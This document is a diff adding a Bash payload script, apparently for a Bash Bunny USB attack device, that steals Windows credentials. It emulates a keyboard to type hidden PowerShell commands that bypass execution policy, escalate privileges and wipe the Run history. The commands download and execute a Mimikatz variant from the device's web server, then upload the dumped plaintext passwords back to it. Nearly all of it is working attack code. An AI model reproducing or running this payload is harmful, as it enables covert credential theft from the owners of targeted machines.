@@ -1,0 +1,46 @@
+#!/bin/bash
+#
+# Title:         MrRobot Mimikatz Attack
+# Author:        illwill
+# Version:       0.1
+#
+# Dumps the usernames & plaintext passwords from Windows boxes using Powershell in memory
+# with Mimikatz then stashes them in /root/udisk/loot/MrRobot
+#
+# Blue...............Starting WebServer
+# Purple.............Running Powershell
+# Green..............Got Creds
+# Red................Didn't Get Creds
+
+source bunny_helpers.sh
+
+LED R 200
+LOOTDIR=/root/udisk/loot/MrRobot
+mkdir -p $LOOTDIR && cd $_
+if [[ -d $LOOTDIR ]]; then cp $SWITCH_POSITION/md.ps1 $LOOTDIR; else LED R G; fi
+
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80
+while ! nc -z $HOST_IP 80; do sleep 0.2; done
+iptables -A INPUT -p udp --dport 53 -j ACCEPT
+
+ATTACKMODE HID RNDIS_ETHERNET
+LED B 200
+Q 
+Q DELAY 1000
+Q GUI r
+Q DELAY 300
+Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c \"Start-Process cmd -A \'\/t\:fe \/k mode con lines\=1 cols\=20\&
+Q STRING reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU \/va \/f\' -Verb runAs\"
+Q ENTER
+Q DELAY 500
+Q REM ALT y
+Q LEFTARROW
+Q DELAY 300
+Q ENTER
+Q DELAY 300
+Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c \"IEX \(New-Object Net.WebClient\).DownloadString\(\'http\:\/\/\$HOST_IP\/md.ps1\'\)\;
+Q \$o \= Invoke-Mimidogz -DumpCred\; \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/\$HOST_IP\/rx.php\'\, \$o\)\"\&exit
+Q ENTER
+
+
